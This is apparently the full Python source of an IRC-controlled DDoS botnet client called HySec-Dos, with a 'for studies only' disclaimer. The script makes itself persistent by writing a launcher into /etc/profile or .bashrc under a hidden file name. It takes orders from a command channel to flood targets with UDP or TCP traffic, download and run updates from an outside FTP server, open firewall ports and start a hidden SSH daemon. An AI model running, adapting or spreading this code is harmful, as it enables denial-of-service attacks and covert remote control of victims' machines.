#!/usr/bin/python

############################################################################
#    HySec-Dos - DDos IRC bot						
#    Copyright (C) 2012  Kamus Hadenes <kamushadenes@hyadesinc.com>
#								
#	 ATTENTION: This is meant for studies only!!!	
#	 Do not use it for the wrong purposes!!!
#	 I'm NOT responsible for anything that may occur if you use it!!!	  
#										
#							
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or	
#    (at your option) any later version.			
#								
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of	
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.		
#							
#    You should have received a copy of the GNU General Public License	   
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
############################################################################


######################### Imports, DO NOT TOUCH #########################

# Network functions
import socket
from ftplib import FTP
import urllib2

# Time functions
from time import sleep, time
import datetime

# OS functions
import sys, os, platform, subprocess
import shutil

# String functions
import string

# Threading functions
from threading import Thread

# Misc functions
from random import random, randint


######################### CONFIGURATION #########################

# IRC server
HOST="irc.freenode.net"
PORT=6667

# FTP server, leave as is if unsure
FTP_HOST='hyadesinc.com'
FTO_PORT='2121'
FTP_LOGIN='secret'
FTP_PASS='secret'
FTP_FILE='HySec-Dos.py'

# Bot hidding name
BNAME="initfS"

# Lock file
LOCK_FILE="/tmp/.initfS"

# Bot information
NICK="HySec-Dos"
IDENT="hysec-dos"
REALNAME="HySec-Dos Bot"

# Channel to enter
CHANNEL="#hyadesinc-command"

# Cloak to obey
CMD_CLOAK="@hyadesinc/"


#############################################################################################################
######################### DO NOT TOUCH BELOW THIS UNLESS YOU KNOW WHAT YOU'RE DOING #########################
#############################################################################################################

######################### More global variables #########################

# Author information
AUTHOR="Kamus Hadenes <kamushadenes@hyadesinc.com>"

# Bot Version
VERSION="20120208_0650"

# URL to fetch public IP
PUBLIC_IP=urllib2.urlopen("http://automation.whatismyip.com/n09230945.asp").read()

# PING controllers
PREVIOUS = str(datetime.datetime.now())
CURRENT = str(datetime.datetime.now())

# Global socket definition
sock = ""

# Flags
do_run = True
do_lock = True
do_update = False

######################### Functions #########################

# Connects do the IRC server
def connect():
	global sock
	if do_run:
		try:
			# Define the socket
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
			
			# Connect
			sock.connect((HOST, PORT))
			
			# Change nick
			set_nick(NICK)
			
			# Set ident
			set_ident(IDENT,HOST,REALNAME)
			
			# Start locking system
			kr = Thread(target=keep_lock)
			kr.start()
			
			# Start reconnection system
			ka = Thread(target=keep_alive)
			ka.start()
			
			sleep(2)
			
			# Start listening
			kl = Thread(target=do_listen)
			kl.start()
		except KeyboardInterrupt:
			die()
		except:
			if do_run:
				# Reconnects in case of failure
				sock.close()
				sleep(10)
				connect()

# Disconnects from the IRC server
def disconnect():
	global sock
	sock.send("QUIT\r\n")

# Sets the bot's nickname
def set_nick(nick):
	sock.send("NICK %s\r\n" % nick)

# Sets the bot's ident
def set_ident(ident,host,realname):
	sock.send("USER %s %s bla :%s\r\n" % (ident, host, realname))

# Joins a channel
def join_channel(channel):
	sock.send ("JOIN %s\r\n" % channel)

# Listen for commands
def do_listen():
	global do_run
	global PUBLIC_IP
	global CURRENT
	global PREVIOUS
	global sock
	global CHANNEL
	global CMD_CLOAK
	readbuffer=""
	# Loops forever
	while 1:
		try:
			if do_run:
				# Received 4kb of data
				readbuffer=sock.recv(4096)
				# Checks if the connection was lost so it can reconnect
				if readbuffer == 0:
					Thread(target=connect).start()
					break
				else:
					# Splits the data so it can be parsed
					temp=string.split(readbuffer, "\n")
					readbuffer=temp.pop()
					for line in temp:
							line=string.rstrip(line)
							line=string.split(line)
							print line
							# If the nick is already in use, change to a random one
							if(line[1]=="433"):
								set_nick(NICK + str(randint(1,10000)))
							# At the end of servers' MOTD, joins the channel
							elif(line[1]=="376"):
								join_channel(CHANNEL)
								if CHANNEL != "#hyadesinc-command":
									join_channel("#hyadesinc-command")
							# At the end of channel name listing, sends a message if it is an update
							elif(line[1]=="366"):
								if do_update:
									privmsg("Update successful on %s (%s)!" % (os.uname()[1],PUBLIC_IP))
							# If the bot receives an error from the server, reconnect
							elif(line[0]=="ERROR"):
								if(line[4]=="throttled."):
									sleep(15)
									Thread(target=connect).start()
									break
							# If the receives a PING, answer with a PONG to keep connection alive
							elif(line[0]=="PING"):
								sock.send("PONG %s\r\n" % line[1])
								PREVIOUS = CURRENT
								CURRENT = datetime.datetime.now()
							# If the bot receives a PRIVMSG, check for commands
							elif(line[1]=="PRIVMSG"):
								# If the user is a lord
								if(CMD_CLOAK in line[0] or "@hyadesinc/" in line[0]):
									# Command that orders the bot to die
									if(line[3]==":.die"):
										if(len(line) > 4):
											if PUBLIC_IP in line[4:len(line)]:
												die()
										else:
											die()
									# Command that orders the bot to update
									elif(line[3]==":.update"):
										if(len(line) > 4):
											if PUBLIC_IP in line[4:len(line)]:
												update()
										else:
											update()
									# Command that orders to bot to fetch system information
									elif(line[3]==":.sysinfo"):
										if(len(line) > 4):
											if PUBLIC_IP in line[4:len(line)]:
												Thread(target=sysinfo).start()
										else:
											Thread(target=sysinfo).start()
									# Command that orders the bot to reply with its version
									elif(line[3]==":.version"):
										if(len(line) > 4):
											if PUBLIC_IP in line[4:len(line)]:
												Thread(target=version).start()
										else:
											Thread(target=version).start()
									# Firewall commands
									elif(line[3]==".fw"):
										if(line[4:len(line)]==PUBLIC_IP):
											# Command to open a port
											if(line[5]=="open"):
												fw_open_port(line[6])
									# Command that orders the bot to start a ssh daemon on a random port
									elif(line[3]==":.sshd"):
										if(line[4:len(line)]==PUBLIC_IP):
											listen_ssh()
									# Flood commands
									elif(line[3]==":.flood"):
										# Command to do a UDP flood
										if(line[4]=="udp"):
											if(len(line) > 8):
												Thread(target=udp_flood, args=(line[5], line[6], line[7],line[8:len(line)])).start()
											else:
												Thread(target=udp_flood, args=(line[5], line[6], line[7],)).start()
										# Command to do a TCP flood
										elif(line[4]=="tcp"):
											if(len(line) > 8):
												Thread(target=tcp_flood, args=(line[5], line[6], line[7],line[8:len(line)])).start()
											else:
												Thread(target=tcp_flood, args=(line[5], line[6], line[7],)).start()
										# Command to do a timed UDP flood
										elif(line[4]=="udp-timed"):
											if(len(line) > 8):
												Thread(target=udp_flood, args=(line[5], line[6], line[7],line[8:len(line)],True)).start()
											else:
												Thread(target=udp_flood, args=(line[5], line[6], line[7],"X",True)).start()
										# Command to do a timed TCP flood
										elif(line[4]=="tcp-timed"):
											if(len(line) > 8):
												Thread(target=tcp_flood, args=(line[5], line[6], line[7],line[8:len(line)],True)).start()
											else:
												Thread(target=tcp_flood, args=(line[5], line[6], line[7],"X",True)).start()
			else:
				break
		except KeyboardInterrupt:
			die()
		except:
			# Reconnects in case of failure
			do_run=False
			sleep(15)
			do_run=True
			Thread(target=connect).start()
			break

# Assures that only one bot will run at the machine at the same time
def keep_lock():
	global LOCK_FILE
	global do_run
	while do_run:
		sleep(10)
		if do_run:
			if do_lock:
				file = open(LOCK_FILE, "w")
				file.write(str(random()))
				file.close()
			else:
				break
		else:
			break

# Keeps the connection alive
def keep_alive():
	global do_run
	global sock
	mask="%Y-%m-%d %H:%M:%S.%f"
	while do_run:
		sleep(10)
		if do_run:
			timedelta = datetime.datetime.strptime(str(CURRENT), mask) - datetime.datetime.strptime(str(PREVIOUS), mask)
			# If the bot didn't received a ping for more than 5 minutes, reconnect
			if (timedelta.seconds/60) > 5:
				do_run=False
				sleep(15)
				do_run=True
				Thread(target=connect).start()
				break
		else:
			break

# TCP flooding
def tcp_flood(target,port,numtimes,data="X",timed=False):
	global sock
	# Defines the TCP socket
	TCPSock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	parsed_data="".join(map(str, data))
	try:
		# Connects to the target
		TCPSock.connect((target,int(port)))
		# Tell the socket that it must not block other connections
		TCPSock.setblocking(0)
		# Defines the socket timeout to none
		TCPSock.settimeout(None)
		# Sends the firts packet
		TCPSock.sendto(parsed_data, (target,int(port)))
		# Check it is a timed attack
		if timed:
			dur = int(time())+int(numtimes)
			pcount = 1
			while int(time()) < dur:
				TCPSock.sendto(parsed_data,(target,int(port)))
				pcount = pcount + 1
				sleep(0.0001)
			c_bytes = int(pcount) * int(len(parsed_data.decode('UTF-8')))
			privmsg("TCP TIMED-FLOOD against %s:%s with string \"%s\" DONE! [%s packages (%s bytes) in %s seconds]" % (target,port,parsed_data,pcount,c_bytes,numtimes))
		# If it is a regular attack
		else:
			for x in range(int(numtimes)):
				TCPSock.sendto(parsed_data,(target,int(port)))
				sleep(0.0001)
			c_bytes = int(numtimes) * int(len(parsed_data.decode('UTF-8')))
			privmsg("TCP FLOOD against %s:%s with string \"%s\" DONE! [%s packages (%s bytes)]" % (target,port,parsed_data,numtimes,c_bytes))
	except:
		privmsg("TCP FLOOD against %s:%s FAILED. (%s)" % (target,port,str(sys.exc_info())))


def udp_flood(target,port,numtimes,data="X",timed=False):
	global sock
	# Defines the UDP socket
	UDPSock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
	# Tell the socket that it must not block other connections
	UDPSock.setblocking(0)
	parsed_data="".join(map(str, data))
	try:
		# Sends the firts packet
		UDPSock.sendto(parsed_data, (target,int(port)))
		# Check if it is a timed attack
		if timed:
			dur = int(time())+int(numtimes)
			pcount = 1
			while int(time()) < dur:
				UDPSock.sendto(parsed_data,(target,int(port)))
				pcount = pcount + 1
				sleep(0.0001)
			c_bytes = int(pcount) * int(len(parsed_data.decode('UTF-8')))
			privmsg("UDP TIMED-FLOOD against %s:%s with string \"%s\" DONE! [%s packages (%s bytes) in %s seconds]" % (target,port,parsed_data,pcount,c_bytes,numtimes))
		# If it is a regular attack
		else:
			for x in range(int(numtimes)):
				UDPSock.sendto(parsed_data,(target,int(port)))
				sleep(0.0001)
			c_bytes = int(numtimes) * int(len(parsed_data.decode('UTF-8')))
			privmsg("UDP FLOOD against %s:%s with string \"%s\" DONE! [%s packages (%s bytes)]" % (target,port,parsed_data,numtimes,c_bytes))
	except:
		privmsg("UDP FLOOD against %s:%s FAILED. (%s)" % (target,port,str(sys.exc_info())))

# Kills the bot
def die():
	global LOCK_FILE
	global sock
	# Sends a good bye message
	privmsg("Heil Hadenes! Heil Hyades!")
	global do_run
	# Changes do_run flag state so all threads can die
	do_run = False
	# Disconnect from the server
	disconnect()
	# Remove the lock
	os.remove(LOCK_FILE)

# Updates the bot
def update():
	global do_lock
	global sock
	global FTP_HOST, FTP_PORT, FTP_USER, FTP_PASS, FTP_FILE
	global LOCK_FILE
	global BNAME
	# Warns of the update
	privmsg("Starting update on %s (%s)..." % (os.uname()[1],PUBLIC_IP))
	# Fetch the file from the FTP server
	ftp = FTP()
	ftp.connect(FTP_HOST,FTP_PORT)
	ftp.login(FTP_USER,FTP_PASS)
	ftp.retrbinary('RETR ' + FTP_FILE, open('/tmp/.trans', 'wb').write)
	ftp.quit()
	# Stop the locking system
	do_lock = False
	sleep(15)
	args = []
	# Removes the lock
	os.remove(LOCK_FILE)
	# Try to copy the file system-wide
	try:
		# Copies the new version
		shutil.copy("/tmp/.trans", "/usr/bin/." + BNAME)
		# Removes the temporary file
		os.remove("/tmp/.trans")
		sleep(2)
		# Executes the new version and detachs
		subprocess.Popen([sys.executable, "/usr/bin/." + BNAME, "update"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		# Kill the old version
		die()
	# If it can't copy system-wide, try as regular user
	except IOError:
		# Gets user's home
		home = os.getenv('USERPROFILE') or os.getenv('HOME')
		# Copies the new version
		shutil.copy("/tmp/.trans", home + "/." + BNAME)
		# Removes the temporary file
		os.remove("/tmp/.trans")
		sleep(2)
		# Executes ther new version and detachs
		subprocess.Popen([sys.executable, '%s/.' + BNAME % home, "update"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		# Kill the old version
		die()

# Gets system information
def sysinfo():
	global sock
	PLATFORM=os.uname()[0]
	HOSTNAME=os.uname()[1]
	KERNEL=os.uname()[2]
	BUILD=os.uname()[3]
	ARCH=os.uname()[4]
	privmsg("Platform: %s (%s) | Hostname: %s (%s) | Kernel: %s (%s)" % (PLATFORM,ARCH,HOSTNAME,PUBLIC_IP,KERNEL,BUILD))

# Returns bot's version
def version():
	global sock
	privmsg("Version %s by %s" % (VERSION,AUTHOR))

# Sends a privmsg
def privmsg(msg,destination="#hyadesinc-command"):
	global sock
	sock.send("PRIVMSG %s :%s\r\n" % (destination,msg))

# Open port on firewall
def fw_open_port(port):
	try:
		subprocess.Popen(["iptables", "-A", "INPUT", "-p", "tcp", "--dport", port, "-j",  "ACCEPT"])
		privmsg("Port open on %s:%s!" % (PUBLIC_IP, port))
	except OSError:
		subprocess.Popen(["/sbin/iptables", "-A", "INPUT", "-p", "tcp", "--dport", port, "-j", "ACCEPT"])
		privmsg("Failed to open port on %s:%s (%s)." % (PUBLIC_IP, port,str(sys.exc_info())))

# Starts a SSH daemon in a random port and opens it
def listen_ssh():
	port = str(randint(8000,65000))
	try:
		subprocess.Popen(["/sbin/sshd", "-p", "%s"  % port])
		fw_open_port(port)
		privmsg("SSH listening on port on %s:%s!" % (PUBLIC_IP, port))
	except OSError:
		subprocess.Popen(["/usr/sbin/sshd", "-p", "%s"  % port])
		privmsg("Failed to start SSH daemon on %s:%s (%s)." % (PUBLIC_IP, port,str(sys.exc_info())))

# Try to pown the system
def pown():
	global BNAME
	home = os.getenv('USERPROFILE') or os.getenv('HOME')
	if platform.system() == "Linux":
		# Tries to pown /etc/profile
		try:
			if not os.path.abspath(__file__) ==  "/usr/bin/." + BNAME:
				shutil.copy(os.path.abspath(__file__), "/usr/bin/." + BNAME)
				file = open("/etc/profile", "r")
				the_string = ['nohup python /usr/bin/.' + BNAME + ' >/dev/null 2>&1 &'] 
				lines = file.readlines()
				a = set([line.strip() for line in lines])
				b = set(the_string)
				if not a & b:
					open("/etc/profile", "a").write("nohup python /usr/bin/." + BNAME + " >/dev/null 2>&1 &")
		# If it fails, tries to pown user's bashrc
		except IOError:
			if not os.path.abspath(__file__) == home + "/." + BNAME:
				shutil.copy(os.path.abspath(__file__), home + "/." + BNAME)
				file = open(home+"/.bashrc", "r")
				the_string = ['nohup python ~/.' + BNAME + ' >/dev/null 2>&1 &'] 
				lines = file.readlines()
				a = set([line.strip() for line in lines])
				b = set(the_string)
				if not a & b:
					open(home + "/.bashrc", "a").write("nohup python ~/." + BNAME + " >/dev/null 2>&1 &")
# Powns the system
pown()


# If it is an update, set the corresponding flag
if "update" in sys.argv:
	do_update = True
	sleep(15)

# Check if the lock exists and is valid
if os.path.isfile(LOCK_FILE):
	# Gets the current lock state
	file = open(LOCK_FILE)
	line = file.readline()
	if line:
		run_check = line
	# Wait 20 seconds and get the lock state again
	sleep(20)
	file2 = open(LOCK_FILE)
	line2 = file2.readline()
	# If the lock state didn't changed, mark it as hanged and connects
	if line2 == run_check:
		connect()
	# Else, the lock is valid, exit normally
	else:
		sys.exit(0)
# If the lock doesn't exists, create it and connect
else:
		file = open(LOCK_FILE, "w")
		file.write(str(random()))
		file.close()
		connect()
